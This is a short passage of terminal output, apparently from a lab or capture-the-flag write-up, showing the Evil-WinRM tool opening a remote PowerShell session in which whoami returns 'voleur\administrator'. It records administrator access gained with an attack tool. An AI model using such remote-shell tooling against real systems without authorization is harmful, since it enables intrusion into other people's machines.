Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```